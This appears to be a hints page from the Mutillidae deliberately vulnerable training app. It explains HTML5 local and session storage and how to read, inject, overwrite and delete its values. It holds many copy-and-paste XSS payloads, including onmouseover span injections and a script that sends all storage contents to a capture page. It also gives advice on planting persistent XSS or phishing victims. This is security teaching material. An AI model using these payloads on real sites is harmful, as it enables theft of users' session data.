			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			HTML5 web storage is a simple database implemented by browsers
			which allows web pages to store records. Records are key-value pairs.
			Both the key and the value are of datatype string.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">HTML5 Storage API</span>
			<br/><br/>
			The Storage interface of the browser API
			<br/>
<code>
interface Storage {
	readonly attribute unsigned long length;
	DOMString? key(unsigned long index);
	getter DOMString getItem(DOMString key);
	setter creator void setItem(DOMString key, DOMString value);
	deleter void removeItem(DOMString key);
	void clear();
}
</code>
			<br/>
			An "interface" is a software class that is only a definition in itself
			and must be implemented to work. The Storage interface is implemented twice
			in the browser as part of the "Window" DOM object. One implementation
			is the "Local Storage" object named "localStorage" and the other is
			the "Session Storage" object named "sessionStorage".
			<br/><br/>
			To call the methods defined in the interface, call them using the "window"
			scope.
			<br/><br/>
			Example:
			<br/>
<code>
// grab local session storage
var m = "";
var l = window.localStorage;
for(i=0;i&lt;l.length;i++){
	var lKey = l.key(i);
	m += lKey + "=" + l.getItem(lKey) + "; ";
}// end for i
alert(m);
</code>
					<br />
					<span class="report-header">Locating pages which use HTML5 storage</span>
					<br /><br />
					Pages using HTML5 storage are easy to locate since the source code is client-side. The
					JavaScript API specifies the session storage objects are named sessionStorage and
					localStorage which are both properties of the window object. Developers may put the
					JavaScript in an included file, so check for JavaScript include file and search the
					source code for "sessionStorage" and "localStorage".
					<br /><br />
					<span class="report-header">Reading HTML5 storage from the Browser</span>
					<br /><br />
					The values a site has placed into your browser can be read by you. They can also
					be changed by you. Developers should know better than to place any type of
					authentication token anywhere on the client, but this problem has existed
					well before HTML5 storage and will continue with HTML storage.
					<br />
			  		If the web developer is trying to hide something in session storage or local storage
			  		that you want to read, you can type JavaScript into your browser address
			  		bar to read the HTML 5 storage. Cookies in general should not contain any
			  		information classified above "public". Developers are constantly making
			  		the mistake of thinking that because cookies happen to be difficult to view,
			  		they cannot be viewed. Functionally, HTML 5 storage is analogous to a big
			  		cookie.
					<br /><br />
					In some browsers, you can run JavaScript against the current page by
					placing the prefix "javascript"
					followed by a colon and your JavaScript into the address bar.
					<br/><br/>
					Try It (Newer Firefox require you allow JavaScript in URL bar (about:config)):
					<br />
<code>
javascript:alert("It Works!");
</code>
				<br />
				NOTE: If new browsers disable JavaScript in the URL bar, install a real-time page
				editor such as FireBug. In Firebug, open the "console" and use the command-line
				area at the bottom (Look for "&gt;&gt;&gt;").
				<br/><br/>
				HTML5 storage provides an API for interaction with JavaScript. Therefore if
				you are using a page that uses HTML5 storage, you can read it with a
				JavaScript. (The HTML5 storage is on your browser, so you may just be
				able to use the browser itself.)
				<br/><br/>
				This script can read HTML5 storage from the page currently being browsed:
				<br />
<code>
&lt;script&gt;
	try{
		var m = &quot;&quot;;
		var l = window.localStorage;
		var s = window.sessionStorage;

		for(i=0;i&lt;l.length;i++){
			var lKey = l.key(i);
			m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
		};

		for(i=0;i&lt;s.length;i++){
			var lKey = s.key(i);
			m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
		};

		alert(m);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
							<br />
							<span class="label">Copy and Paste</span>:
							<br /><br />
<code>
<span class="important-code">// JavaScript Alert Box version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage; var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">alert(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// window.document.write version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">window.document.write(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// Fireug console.log() or console.debug() version</span>
<span class="important-code">// NOTE: This version must be executed in the Firebug console</span>
try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">console.log(m)</span>;}catch(e){alert(e.message);}
</code>

				<br />
				Except in SECURE mode, this page has some "secrets" hidden in the HTML5 storage.
				To figure out what are the items, use a JavaScript injection in the Back button or
				the page footer (HTTP user-agent header) to inject your own JavaScript.
				An easier way would be to remember that all the HTML5 storage and all JavaScript
				is client-side which means it is running on your machine. You can simply read the
				JavaScript that set the storage items.
				<br/><br/>
				<span class="report-header">Injecting values into session storage</span>
				<br /><br />
				If you are visiting a web site utilizing HTML5 storage, the storage is on your
				browser so injecting values is relatively easy but remember that HTML5 storage
				is stored by domain, protocol, and port so any code used to set storage values
				must be done in the context of the target page.
				<br /><br />
				This script will inject the following keys with the following values into the
				current page context. This context will be valid as long as the domain, protocol,
				and port do not change.
				<br/>
<code>
&lt;script&gt;
	localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);
	sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
	sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);
	sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);
&lt;/script&gt;
</code>
				<br />
				<span class="label">Copy and Paste</span>:
				<br />
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); &lt;/script&gt;
</code>
				<br />
				After setting the values, read them back for confirmation. Use the scripts
				under section "Reading HTML5 storage". In fact, we can combine the two scripts
				and run them back to back.
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage; for(i=0;i&lt;l.length;i++){ var lKey = l.key(i); m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;}; for(i=0;i&lt;s.length;i++){ var lKey = s.key(i); m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;}; alert(m);}catch(e){ alert(e.message); } &lt;/script&gt;
</code>
				<br /><br />
				<span class="report-header">Over-writing existing HTML5 storage values</span>
				<br /><br/>
				Determine what the existing key-value pairs are in the HTML5 storage.
				Use the scripts under section "Reading HTML5 storage". Choose the
				key-value pair to set. Finally use a script to over-write the
				key-value pair. Note that the setItem() methods adds a new
				key-value pair if the key does not already exist but over-writes
				the current value if the key is present.
				<br /><br />
				A smaller script can be used to read the currently stored keys:
				<br />
<code>
&lt;script&gt; var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; for(i=0;i&lt;s.length;i++){m += &quot;sessionStorage:&quot; + s.key(i) + &quot;;\n&quot;;} for(i=0;i&lt;l.length;i++){m += &quot;localStorage:&quot; + l.key(i) + &quot;;\n&quot;;} alert(m); &lt;/script&gt;
</code>
							<br />
							One of the keys on this page is "MessageOfTheDay". To change that particular
							value, we can use another script:
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); &lt;/script&gt;
</code>
							<br />
							Depending on when this script is injected, the page may not display the changes.
							An inspection of the code reveals that the page calls a function "init()"
							in order to display the current values. Calling "init()" again after
							changing the value should show the change. Watch carefully. The page will
							display HTML5 storage from the initial call to init() then display
							all the values again. Notice the message of the day is different in the
							second listing. Here is the modified script.
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">init();</span>&lt;/script&gt;
</code>
							<br/>
							One problem is the user might notice the page is not the same. Instead of one "MessageOfTheDay"
							there are now two; the original message plus the new message added by the cross-site script.
							To solve this issue, first overwrite the original message, then delete all the table rows being displayed.
							To delete the messages, use JavaScript to alter the DOM on the page.
							Finally call the pages own init() function to redraw the table.
							<br/>
							Hint: Click "View Source" and read the JavaScript in the init() function. It shows that the
							&quot;idSessionStorageTableBody&quot; is the HTML DOM element to which the table
							rows are added.
							<br/>
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">var node=window.document.getElementById(&quot;idSessionStorageTableBody&quot;); while(node.hasChildNodes()){node.removeChild(node.firstChild)};</span> init();&lt;/script&gt;
</code>
							<br /><br />
							<span class="report-header">Reading another users HTML5 storage</span>
							<br/><br/>
							If you want to read someone elses session storage or local storage,
							remember where the storage is located. The storage is on the client
							machine	and is only accessible by scripts running in their browser.
							Therefore you need to get your JavaScript to run on that users machine.
							One way to do this is to either plant a persistent cross site script (XSS)
							and wait for the user to visit the infected site or phish using a
							reflected cross site script.
							<br/><br/>
							If injecting JavaScript into HTML, using a body-onload event or an image
							tag can be effective without overtly alerting the user. JavaScript can
							also be injected by wrapping the JavaScript code in script tags.
							<br/><br/>
							If injecting JavaScript into existing JavaScript code,
							using an XHR (aka AJAX aka Web 2.0) script is a good way to inject scripts
							because the resulting script execution is less likely to be noticed by
							the user.
							<br/><br/>
							We can collect the HTML5 storage using the same script as in "Reading HTML5
							Storage" but instead of displaying the data in a popup alert box we can
							send the data to a capture page.
							<br/>
<code>
&lt;script&gt;
	try{
		var s = sessionStorage;
		var l = localStorage;
		var m = &quot;&quot;;
		var lXMLHTTP;

		for(i=0;i&lt;s.length;i++){
			m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;;
		}

		for(i=0;i&lt;l.length;i++){
			m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;;
		}

		var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;
		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){};
		lXMLHTTP.open(&quot;GET&quot;, lAction);
		lXMLHTTP.send(&quot;&quot;);
	}catch(e){}
&lt;/script&gt;
</code>
							<br/>
							<fieldset>
								<legend>Copy and Paste</legend>
								<textarea rows="5" cols="50">
								&lt;script&gt; try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
								</textarea>
							</fieldset>
							<br/>
								Try injecting JavaScript into the user-agent HTTP header because it is displayed
								in the footer.
							<br /><br />
							<span class="report-header">Where is this page vulnerable to cross site scripting</span>
							<br/><br/>
							The add new key field is vulnerable to HTML injection and event based JavaScript
							injection because the keys that are added by the user are reflected back when
							the page inserts the key into the span using the innerHTML property.
							<br/><br/>
							For example, the following key can injected along with any value.
							<br/>
<code>
&lt;/span&gt;&lt;span onmouseover=&quot;alert(1);&quot;&gt;ERROR&lt;/span&gt;&lt;span&gt;
</code>
							<br/>
							The "BACK" button is vulnerable to JavaScript injection and the page footer
							displays the value of the user-agent string making it vulnerable as well.
							<br/><br/>
							The most practical vulnerabilities is the users message. Note the site does
							not output encode the username or the users message. These values are
							database values meaning they present a persistent cross site script.

							<br /><br />
							<span class="report-header">Code which can read values from HTML-5 Web Storage</span>
							<br/><br/>
<code>
try{
	var m = &quot;&quot;;
	var l = window.localStorage;
	var s = window.sessionStorage;

	for(i=0;i&lt;l.length;i++){
		var lKey = l.key(i);
		m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
	};//end for

	for(i=0;i&lt;s.length;i++){
		var lKey = s.key(i);
		m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
	};//end for

	console.log(m);
}catch(e){
	alert(e.message);
}
</code>
<br /><br />
<span class="report-header">Read DOM Storage values from our browser</span>
<br/><br/>
<span class="label">Plan A (Run in firebug console):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};console.log(m);}catch(e){alert(e.message);}
	</textarea>
</fieldset>
<br />
<span class="label">Plan B (DOM Injection in "new key" field):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	&lt;span onmouseover=&#39;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};alert(m);}catch(e){alert(e.message);}&#39;&gt;DANGER: DONT MOUSEOVER&lt;/span&gt;
	</textarea>
</fieldset>
<br /><br />
<span class="report-header">Add new values to our DOM storage and read them back to show new values</span>
<br/><br/>
<span class="label">Plan A (Run in firebug console):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	try{localStorage.setItem(&quot;AccountNumber&quot;,&quot;789456&quot;);sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);}catch(e){alert(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};console.log(m);}catch(e){alert(e.message);}
	</textarea>
</fieldset>
<br />
<span class="label">Plan B (DOM Injection in "new key" field):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	&lt;span onmouseover=&#39;try{localStorage.setItem(&quot;AccountNumber&quot;,&quot;789456&quot;);sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);}catch(e){alert(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};alert(m);}catch(e){alert(e.message);}&#39;&gt;DANGER: DONT MOUSEOVER&lt;/span&gt;
	</textarea>
</fieldset>
<br /><br />
<span class="report-header">Edit values currently in our DOM storage and read them back to show new values</span>
<br/><br/>
<span class="label">Plan A (Run in firebug console):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};console.log(m);}catch(e){alert(e.message);}try{localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;This was set by Firebug console!&quot;); sessionStorage.setItem(&quot;CartSession&quot;,&quot;ABCDEFG&quot;);}catch(e){alert(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};console.log(m);}catch(e){alert(e.message);}
	</textarea>
</fieldset>
<br />
<span class="label">Plan B (DOM Injection in "new key" field):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	&lt;span onmouseover=&#39;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};alert(m);}catch(e){alert(e.message);}try{localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;This was set by Firebug console!&quot;); sessionStorage.setItem(&quot;CartSession&quot;,&quot;ABCDEFG&quot;);}catch(e){alert(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};alert(m);}catch(e){alert(e.message);}&#39;&gt;DANGER: DONT MOUSEOVER&lt;/span&gt;
	</textarea>
</fieldset>
<br /><br />
<span class="report-header">Delete values currently in our DOM storage and read storage back</span>
<br/><br/>
<span class="label">Plan A (Run in firebug console using the removeItem() method):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.removeItem(&quot;MessageOfTheDay&quot;); sessionStorage.removeItem(&quot;CartSession&quot;); sessionStorage.removeItem(&quot;CurrentBrowser&quot;); sessionStorage.removeItem(&quot;SessionStorageTarget&quot;); localStorage.removeItem(&quot;LocalStorageTarget&quot;);}catch(e){console.log(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.console.log(m);}catch(e){console.log(e.message);}
	</textarea>
</fieldset>
<br />
<span class="label">Alternative: Use the clear method</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.clear(); sessionStorage.clear();}catch(e){console.log(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.console.log(m);}catch(e){console.log(e.message);}
	</textarea>
</fieldset>
<br />
<span class="label">Plan B (DOM Injection in "new key" field):</span>
<br />
<fieldset>
	<legend>Copy and Paste</legend>
	<textarea rows="5" cols="50">
	&lt;span onmouseover=&#39;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem(&quot;MessageOfTheDay&quot;); sessionStorage.removeItem(&quot;CartSession&quot;);}catch(e){alert(e.message);}try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};window.alert(m);}catch(e){alert(e.message);}&#39;&gt;DANGER: DONT MOUSEOVER&lt;/span&gt;
	</textarea>
</fieldset>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart1WhatisReflectedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart2WhatisDOMbasedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart3WhatisPersistentXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart1HowItStopsCrosssiteScriptingXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart2HowtoTestifitWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart1);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart2);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart3);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart4);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart5);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ContentSecurityPolicyScriptSourcescriptsrc);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoSetHTTPHeadersUsingApacheServer);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckHTTPHeaderswithcURL);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersCommandLine);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersfromBrowser);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CookiesPart1HowHTTPOnlyWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatistheXSSProtectionHeader);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckforVulnerableLibrariesinYourWebApplication);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoEnableApacheModHeader);?>
<br/><br/>